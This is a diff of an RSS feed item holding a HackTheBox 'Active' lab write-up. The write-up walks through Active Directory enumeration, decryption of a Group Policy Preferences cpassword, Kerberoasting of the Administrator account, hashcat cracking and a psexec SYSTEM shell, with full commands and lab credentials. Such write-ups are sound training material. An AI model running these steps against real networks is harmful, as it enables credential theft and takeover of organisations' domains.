@@ -8,6 +8,285 @@
     <lastBuildDate>Thu, 15 Jul 2021 13:17:29 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/kerberoasting/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>HackTheBox - Active</title>
+      <link>https://fahmifj.github.io/hackthebox/active/</link>
+      <pubDate>Thu, 15 Jul 2021 13:17:29 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/hackthebox/active/</guid>
+      <description>Finding passwords in Group Policy Preferences and roasting Kerberos</description>
+      <content:encoded><![CDATA[<p>Active is an Active Directory system, it starts off by enumerating an SMB share to find a set of credentials from Group Policy Preferences (GPP). Using that credentials on LDAP reveals that the administrator account has a Service Principal Name attribute of a CIFS service. This leads to a Kerberoasting attack which allows attackers to obtain the password hash of administrator account and crack it. The cracked password is used to login remotely.</p>
+<h4 id="skills-learned">Skills Learned</h4>
+<ul>
+<li>Active Directory GPP</li>
+<li>Kerberoasting</li>
+</ul>
+<h4 id="tools">Tools</h4>
+<ul>
+<li>Nmap</li>
+<li>Impacket</li>
+<li>CrackMapExec</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>A full TCP scan (after  <code>-p-</code> performed) discovers a bunch of open ports. The most notable ports are: 53 (DNS), 88 (Kerberos), 139-445 (SMB/RPC), and 389 (LDAP). According to these open ports, I can assume that this is an Active Directory.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.83» 
+$ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,04915,49169,49172,49180 -sC -sV -oA nmap/10-tcp-allport-script-active 10.10.10.100
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-10 23:20 EDT
+Nmap scan report <span class="k">for</span> 10.10.10.100
+Host is up <span class="o">(</span>0.072s latency<span class="o">)</span>.
+
+PORT      STATE  SERVICE       VERSION
+53/tcp    open   domain        Microsoft DNS 6.1.7601 <span class="o">(</span>1DB15D39<span class="o">)</span> <span class="o">(</span>Windows Server <span class="m">2008</span> R2 SP1<span class="o">)</span>
+<span class="p">|</span> dns-nsid: 
+<span class="p">|</span>_  bind.version: Microsoft DNS 6.1.7601 <span class="o">(</span>1DB15D39<span class="o">)</span>
+88/tcp    open   kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server time: 2021-07-11 03:20:53Z<span class="o">)</span>
+135/tcp   open   msrpc         Microsoft Windows RPC
+139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open   ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: active.htb, Site: Default-First-Site-Name<span class="o">)</span>
+445/tcp   open   microsoft-ds?
+464/tcp   open   kpasswd5?
+593/tcp   open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open   tcpwrapped
+3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: active.htb, Site: Default-First-Site-Name<span class="o">)</span>
+3269/tcp  open   tcpwrapped
+4915/tcp  closed frcs
+5722/tcp  open   msrpc         Microsoft Windows RPC
+9389/tcp  open   mc-nmf        .NET Message Framing
+47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+<span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+<span class="p">|</span>_http-title: Not Found
+49152/tcp open   msrpc         Microsoft Windows RPC
+49153/tcp open   msrpc         Microsoft Windows RPC
+49154/tcp open   msrpc         Microsoft Windows RPC
+49155/tcp open   msrpc         Microsoft Windows RPC
+49157/tcp open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49169/tcp open   msrpc         Microsoft Windows RPC
+49172/tcp open   msrpc         Microsoft Windows RPC
+49180/tcp open   msrpc         Microsoft Windows RPC
+Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+
+Host script results:
+<span class="p">|</span>_clock-skew: 4s
+<span class="p">|</span> smb2-security-mode: 
+<span class="p">|</span>   2.02: 
+<span class="p">|</span>_    Message signing enabled and required
+<span class="p">|</span> smb2-time: 
+<span class="p">|</span>   date: 2021-07-11T03:21:48
+<span class="p">|</span>_  start_date: 2021-07-09T05:18:19
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 71.11 seconds
+</code></pre></div><p><code>nmap</code> identified the domain name as <code>active.htb</code> and the OS version to be Windows Server 2008, which most likely vulnerable to ZeroLogon (CVE-2020-1472) and PrintNightmare (CVE-2021-1675/CVE-2021-34527). But, I will consider these vulnerabilities as alternative methods and put them in separate post (Update! see <a href="https://fahmifj.github.io/blog/play-with-printnightmare/">PrintNightmare</a>).</p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-53---dns">TCP 53 - DNS</h3>
+<p>There is no zone transfer in this machine.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.83» 
+$ dig axfr @10.10.10.100 10.10.10.100
+
+<span class="p">;</span> &lt;&lt;&gt;&gt; DiG 9.16.15-Debian &lt;&lt;&gt;&gt; axfr @10.10.10.100 10.10.10.100
+<span class="p">;</span> <span class="o">(</span><span class="m">1</span> server found<span class="o">)</span>
+<span class="p">;;</span> global options: +cmd
+<span class="p">;</span> Transfer failed.
+</code></pre></div><h3 id="tcp-139445---smb">TCP 139,445 - SMB</h3>
+<p><code> smbmap</code> identifies that anonymous logon is allowed and it has read access on  <code>Replication</code> share.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.83» 
+$ smbmap -u <span class="s1">&#39;&#39;</span> -p <span class="s1">&#39;&#39;</span> -H 10.10.10.100
+<span class="o">[</span>+<span class="o">]</span> IP: 10.10.10.100:445        Name: active.htb                                        
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        IPC$                                                    NO ACCESS       Remote IPC
+        NETLOGON                                                NO ACCESS       Logon server share 
+        Replication                                             READ ONLY
+        SYSVOL                                                  NO ACCESS       Logon server share 
+        Users                                                   NO ACCESS
+</code></pre></div><h4 id="replication-share">Replication Share</h4>
+<p>The <code>Replication</code> share contains a lot of folders. I will download them all recursively.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.83» 
+$ smbclient -N //10.10.10.100/Replication
+Anonymous login successful
+Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> ls
+  .                                   D        <span class="m">0</span>  Sat Jul <span class="m">21</span> 06:37:44 <span class="m">2018</span>
+  ..                                  D        <span class="m">0</span>  Sat Jul <span class="m">21</span> 06:37:44 <span class="m">2018</span>
+  active.htb                          D        <span class="m">0</span>  Sat Jul <span class="m">21</span> 06:37:44 <span class="m">2018</span>
+
+                <span class="m">10459647</span> blocks of size 4096. <span class="m">5722238</span> blocks available
+smb: <span class="se">\&gt;</span> recurse on
+smb: <span class="se">\&gt;</span> prompt of
+smb: <span class="se">\&gt;</span> mget * 
+getting file <span class="se">\a</span>ctive.htb<span class="se">\P</span>olicies<span class="se">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span><span class="se">\G</span>PT.INI of size <span class="m">23</span> as active.htb/Policies/<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>/GPT.INI <span class="o">(</span>0.1 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.1 KiloBytes/sec<span class="o">)</span>
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div><p>The only interesting file there is the <code>Groups.xml</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «active.htb» «10.10.14.83» 
+$ find . -type f -iname groups.xml                                                                            
+./Policies/<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>/MACHINE/Preferences/Groups/Groups.xml
+</code></pre></div><p>This <code>groups.xml</code> contains a <code>cpassword</code> of user <strong>active.htb\SVC_TGS</strong>. I will note this password.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «active.htb» «10.10.14.83» 
+$ cat ./Policies/<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>/MACHINE/Preferences/Groups/Groups.xml
+&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">&#34;1.0&#34;</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span>?&gt;
+&lt;Groups <span class="nv">clsid</span><span class="o">=</span><span class="s2">&#34;{3125E937-EB16-4b4c-9934-544FC6D24D26}&#34;</span>&gt;&lt;User <span class="nv">clsid</span><span class="o">=</span><span class="s2">&#34;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&#34;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;active.htb\SVC_TGS&#34;</span> <span class="nv">image</span><span class="o">=</span><span class="s2">&#34;2&#34;</span> <span class="nv">changed</span><span class="o">=</span><span class="s2">&#34;2018-07-18 20:46:06&#34;</span> <span class="nv">uid</span><span class="o">=</span><span class="s2">&#34;{EF57DA28-5F69-4530-A59E-AAB58578219D}&#34;</span>&gt;&lt;Properties <span class="nv">action</span><span class="o">=</span><span class="s2">&#34;U&#34;</span> <span class="nv">newName</span><span class="o">=</span><span class="s2">&#34;&#34;</span> <span class="nv">fullName</span><span class="o">=</span><span class="s2">&#34;&#34;</span> <span class="nv">description</span><span class="o">=</span><span class="s2">&#34;&#34;</span> <span class="nv">cpassword</span><span class="o">=</span><span class="s2">&#34;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&#34;</span> <span class="nv">changeLogon</span><span class="o">=</span><span class="s2">&#34;0&#34;</span> <span class="nv">noChange</span><span class="o">=</span><span class="s2">&#34;1&#34;</span> <span class="nv">neverExpires</span><span class="o">=</span><span class="s2">&#34;1&#34;</span> <span class="nv">acctDisabled</span><span class="o">=</span><span class="s2">&#34;0&#34;</span> <span class="nv">userName</span><span class="o">=</span><span class="s2">&#34;active.htb\SVC_TGS&#34;</span>/&gt;&lt;/User&gt;
+&lt;/Groups&gt;
+</code></pre></div><h3 id="tcp-389---ldap">TCP 389 - LDAP</h3>
+<p>There is nothing much I can do in LDAP.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «active.htb» «10.10.14.83»  
+$ ldapsearch -LLL -x -h 10.10.10.100 -s base namingContexts 
+dn:
+namingContexts: <span class="nv">DC</span><span class="o">=</span>active,DC<span class="o">=</span>htb
+namingContexts: <span class="nv">CN</span><span class="o">=</span>Configuration,DC<span class="o">=</span>active,DC<span class="o">=</span>htb
+namingContexts: <span class="nv">CN</span><span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>active,DC<span class="o">=</span>htb
+namingContexts: <span class="nv">DC</span><span class="o">=</span>DomainDnsZones,DC<span class="o">=</span>active,DC<span class="o">=</span>htb
+namingContexts: <span class="nv">DC</span><span class="o">=</span>ForestDnsZones,DC<span class="o">=</span>active,DC<span class="o">=</span>htb
+→ kali@kali «active» «10.10.14.75» 
+$ ldapsearch -LLL -x -h 10.10.10.100 -b <span class="s2">&#34;dc=active,dc=htb&#34;</span> 
+Operations error <span class="o">(</span>1<span class="o">)</span>
+Additional information: 000004DC: LdapErr: DSID-0C09075A, comment: In order to perform this operation a successful <span class="nb">bind</span> must be completed on the connection., data 0, v1db1
+</code></pre></div><h2 id="foothold">Foothold</h2>
+<h3 id="access-as-svc_tgs">Access as SVC_TGS</h3>
+<h4 id="group-policy-preferences-gpp---password-decrypt">Group Policy Preferences (GPP) - Password Decrypt</h4>
+<p>In Windows Server 2008, Microsoft introduced a feature called <strong>Group Policy Preferences</strong>. This feature allows various Windows configurations/settings, including changing local administrator passwords, to be distributed to domain-joined computers through Group Policy.</p>
+<p>When a GPP is created, it also creates an associated XML file in SYSVOL share. Some of the XML files may contains a set of credentials encrypted with AES-256. However, Microsoft <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN">published the encryption key</a> and that key can be used to decrypt the password (<code>cpassword</code>) in the XML file.</p>
+<p>Kali comes with a tool called <code>gpp-decrypt</code>, and this tool can be used to decrypt the <code>cpassword</code> I obtained from the <code>Groups.xml</code> file.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «active.htb» «10.10.14.83» 
+$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ          
+GPPstillStandingStrong2k18
+</code></pre></div><h4 id="users-share">Users Share</h4>
+<p><code>CrackMapExec</code> confirms that the credentials (<code>SVC_TGS:GPPstillStandingStrong2k18</code>) are valid. I have read access now on the three other shares.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.83» 
+$ crackmapexec smb active.htb -u <span class="s1">&#39;SVC_TGS&#39;</span> -p <span class="s1">&#39;GPPstillStandingStrong2k18&#39;</span> --shares
+SMB         10.10.10.100    <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Windows 6.1 Build <span class="m">7601</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:active.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.100    <span class="m">445</span>    DC               <span class="o">[</span>+<span class="o">]</span> active.htb<span class="se">\S</span>VC_TGS:GPPstillStandingStrong2k18 
+SMB         10.10.10.100    <span class="m">445</span>    DC               <span class="o">[</span>+<span class="o">]</span> Enumerated shares
+SMB         10.10.10.100    <span class="m">445</span>    DC               Share           Permissions     Remark
+SMB         10.10.10.100    <span class="m">445</span>    DC               -----           -----------     ------
+SMB         10.10.10.100    <span class="m">445</span>    DC               ADMIN$                          Remote Admin
+SMB         10.10.10.100    <span class="m">445</span>    DC               C$                              Default share
+SMB         10.10.10.100    <span class="m">445</span>    DC               IPC$                            Remote IPC
+SMB         10.10.10.100    <span class="m">445</span>    DC               NETLOGON        READ            Logon server share 
+SMB         10.10.10.100    <span class="m">445</span>    DC               Replication     READ            
+SMB         10.10.10.100    <span class="m">445</span>    DC               SYSVOL          READ            Logon server share 
+SMB         10.10.10.100    <span class="m">445</span>    DC               Users           READ  
+</code></pre></div><p>Looking into the  <code>Users</code> share, I&rsquo;m sure this share is <code>C:\Users\</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «active.htb» «10.10.14.83» 
+$ smbclient -N //10.10.10.100/Users -U <span class="s1">&#39;SVC_TGS%GPPstillStandingStrong2k18&#39;</span>
+Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> ls
+  .                                  DR        <span class="m">0</span>  Sat Jul <span class="m">21</span> 10:39:20 <span class="m">2018</span>
+  ..                                 DR        <span class="m">0</span>  Sat Jul <span class="m">21</span> 10:39:20 <span class="m">2018</span>
+  Administrator                       D        <span class="m">0</span>  Mon Jul <span class="m">16</span> 06:14:21 <span class="m">2018</span>
+  All Users                       DHSrn        <span class="m">0</span>  Tue Jul <span class="m">14</span> 01:06:44 <span class="m">2009</span>
+  Default                           DHR        <span class="m">0</span>  Tue Jul <span class="m">14</span> 02:38:21 <span class="m">2009</span>
+  Default User                    DHSrn        <span class="m">0</span>  Tue Jul <span class="m">14</span> 01:06:44 <span class="m">2009</span>
+  desktop.ini                       AHS      <span class="m">174</span>  Tue Jul <span class="m">14</span> 00:57:55 <span class="m">2009</span>
+  Public                             DR        <span class="m">0</span>  Tue Jul <span class="m">14</span> 00:57:55 <span class="m">2009</span>
+  SVC_TGS                             D        <span class="m">0</span>  Sat Jul <span class="m">21</span> 11:16:32 <span class="m">2018</span>
+
+                <span class="m">10459647</span> blocks of size 4096. <span class="m">5722238</span> blocks available
+</code></pre></div><p>And there is a user flag in <code>SVC_TGS\Desktop</code>. I can read the flag with <code>more</code> command.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">smb: \&gt; ls SVC_TGS\Desktop\
+  .                                   D        0  Sat Jul 21 11:14:42 2018
+  ..                                  D        0  Sat Jul 21 11:14:42 2018
+  user.txt                            A       34  Sat Jul 21 11:06:25 2018
+
+                10459647 blocks of size 4096. 5722238 blocks available
+smb: \&gt; more SVC_TGS\Desktop\user.txt
+getting file \SVC_TGS\Desktop\user.txt of size 34 as /tmp/smbmore.uhunaP (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210711104959070.png" alt="image-20210711104959070"  /></div>
+</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-nt-authoritysystem">Shell as NT Authority\SYSTEM</h3>
+<h4 id="ldap---spn-enumeration">LDAP - SPN enumeration</h4>
+<p>With <code>SVC_TGS</code> credentials, I&rsquo;m able to access the LDAP service. It was found that the administrator has the <code>servicePrincipalName</code> (SPN) attribute set.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.83» 
+$ ldapsearch -LLL -x -D <span class="s1">&#39;SVC_TGS@active.htb&#39;</span> -w <span class="s1">&#39;GPPstillStandingStrong2k18&#39;</span> -h 10.10.10.100 -b <span class="s2">&#34;dc=active,dc=htb&#34;</span> <span class="s2">&#34;(&amp;(objectClass=user)(objectCategory=user)(servicePrincipalName=*))&#34;</span> 
+dn: <span class="nv">CN</span><span class="o">=</span>Administrator,CN<span class="o">=</span>Users,DC<span class="o">=</span>active,DC<span class="o">=</span>htb
+
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+adminCount: <span class="m">1</span>
+accountExpires: <span class="m">0</span>
+logonCount: <span class="m">34</span>
+sAMAccountName: Administrator
+sAMAccountType: <span class="m">805306368</span>
+servicePrincipalName: active/CIFS:445
+objectCategory: <span class="nv">CN</span><span class="o">=</span>Person,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>active,DC<span class="o">=</span>htb
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div><h4 id="kerberoasting">Kerberoasting</h4>
+<p>If a Service Principal Name is registered into a user account, the account is vulnerable to an attack called <strong>Kerberoasting</strong>. It is an attack against Kerberos to steal a <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/4a624fb5-a078-4d30-8ad1-e9ab71e0bc47#gt_b4041466-ae24-4fd4-83e4-5dbc4f32aaab">Service Ticket</a> (ST).</p>
+<p>The attack is well explained in <a href="https://luemmelsec.github.io/Kerberoasting-VS-AS-REP-Roasting/">this blog</a> and <a href="https://hebo.gitbook.io/hackbook/active-directory/kerberoasting#0x02-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5">this one</a>, but I will try to give an overview using the following image created by <a href="http://www.diva-portal.se/smash/get/diva2:1358687/FULLTEXT01.pdf">David Freimannis</a>. The <strong>Kerberoasting</strong> attack indicated by a red box starting from step number 3.</p>
+<p><div class="img-container"><img src="imgs/image-20210715120848088.png" alt="image-20210715120848088"  title="Kerberos Mechanism"  /></div>
+</p>
+<center><small>Taken from “Vulnerability Assessment of Authentication Methods in a Large-Scale Computer System” by David Freimanis</small></center>
+<p>Using this case, I want to access a CIFS service, so I need to ask the server (KDC) for it. The server will then search for the SPN of the CIFS service, which is <code>active/CIFS:445</code>, and that SPN is registered to the administrator account. Once the SPN is found, the server will issue a TGS (Ticket Granting Service) encrypted with NTLM hash  (derived from password)  of the administrator account and send that to the requester which is me. Now that I have TGS for the CIFS service, but instead of using (forwarding) this ticket to authenticate to the corresponding service, I keep the ticket and attempt a brute-force attack against it to recover the administrator password.</p>
+<blockquote>
+<p>If the SPN is registered to a computer account, it would be almost impossible to crack the TGS ticket since a computer account password is a random 128 character.</p>
+</blockquote>
+<p>There are several tools out there that can be used to perform a Kerberoasting attack, but I&rsquo;ll use the one from Impacket called <code>Impacket-GetUserSPNs</code>. The tool captures the ticket and automatically formats it into hashcat crackable format.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.75» 
+$ impacket-GetUserSPNs active.htb/SVC_TGS:<span class="s1">&#39;GPPstillStandingStrong2k18&#39;</span> -dc-ip 10.10.10.100 -request-user administrator
+Impacket v0.9.22 - Copyright <span class="m">2020</span> SecureAuth Corporation
+
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+active/CIFS:445       Administrator  <span class="nv">CN</span><span class="o">=</span>Group Policy Creator Owners,CN<span class="o">=</span>Users,DC<span class="o">=</span>active,DC<span class="o">=</span>htb  2018-07-18 15:06:40.351723  2021-07-14 12:36:18.277545             
+
+
+
+<span class="nv">$krb5tgs$23$*</span>Administrator<span class="nv">$ACTIVE</span>.HTB<span class="nv">$active</span>.htb/Administrator*<span class="nv">$92</span>c75d0a49cbaf166e656a7350827d0c<span class="nv">$a775e30</span>...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div><h4 id="tgs-crack">TGS Crack</h4>
+<p>The password of from the obtained TGS can be recovered using hashcat.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ ./hashcat.exe -m <span class="m">13100</span> hashes/svc_tgs.krbhash ../../rockyou.txt -O
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+<span class="nv">$krb5tgs$23$*</span>Administrator<span class="nv">$ACTIVE</span>.HTB<span class="nv">$active</span>.htb/Administrator*<span class="nv">$92</span>c75d0a49cbaf166e656a7350827d0c<span class="nv">$a775e30</span>...<span class="o">[</span>SNIP<span class="o">]</span>...:Ticketmaster1968
+</code></pre></div><p>It is  <code>Ticketmaster1968</code>.</p>
+<h4 id="impacket-psexec">Impacket-psexec</h4>
+<p>Using the administrator account along with the obtained password, I&rsquo;m able to get a shell as local system using <code>impacket-psexec</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.83» 
+$ impacket-psexec active.htb/administrator:<span class="s1">&#39;Ticketmaster1968&#39;</span>@10.10.10.100
+Impacket v0.9.22 - Copyright <span class="m">2020</span> SecureAuth Corporation
+
+<span class="o">[</span>*<span class="o">]</span> Requesting shares on 10.10.10.100.....
+<span class="o">[</span>*<span class="o">]</span> Found writable share ADMIN$
+<span class="o">[</span>*<span class="o">]</span> Uploading file olAAJsqj.exe
+<span class="o">[</span>*<span class="o">]</span> Opening SVCManager on 10.10.10.100.....
+<span class="o">[</span>*<span class="o">]</span> Creating service mvjR on 10.10.10.100.....
+<span class="o">[</span>*<span class="o">]</span> Starting service mvjR.....
+<span class="o">[</span>!<span class="o">]</span> Press <span class="nb">help</span> <span class="k">for</span> extra shell commands
+Microsoft Windows <span class="o">[</span>Version 6.1.7601<span class="o">]</span>
+Copyright <span class="o">(</span>c<span class="o">)</span> <span class="m">2009</span> Microsoft Corporation.  All rights reserved.
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami <span class="o">&amp;&amp;</span> ipconfig
+nt authority<span class="se">\s</span>ystem
+
+Windows IP Configuration
+
+
+Ethernet adapter Local Area Connection:
+
+   Connection-specific DNS Suffix  . : 
+   IPv4 Address. . . . . . . . . . . : 10.10.10.100
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 10.10.10.2
+
+Tunnel adapter isatap.<span class="o">{</span>B3FEC2C7-47CA-4014-A441-A3A5CDDC983C<span class="o">}</span>:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : 
+</code></pre></div><p>The root flag is done here.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;type <span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
+b5fc76...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div><hr>
+<h2 id="references">Reference(s)</h2>
+<ul>
+<li><a href="https://adsecurity.org/?p=2288">https://adsecurity.org/?p=2288</a></li>
+<li><a href="https://hebo.gitbook.io/hackbook/active-directory/kerberoasting">https://hebo.gitbook.io/hackbook/active-directory/kerberoasting</a></li>
+<li><a href="https://luemmelsec.github.io/Kerberoasting-VS-AS-REP-Roasting/">https://luemmelsec.github.io/Kerberoasting-VS-AS-REP-Roasting/</a></li>
+<li><a href="http://www.diva-portal.se/smash/get/diva2:1358687/FULLTEXT01.pdf">http://www.diva-portal.se/smash/get/diva2:1358687/FULLTEXT01.pdf</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>HackTheBox - Active</title>
       <link>https://fahmifj.github.io/writeups/hackthebox/htb-active/</link>
       <pubDate>Thu, 15 Jul 2021 13:17:29 +0700</pubDate>
       
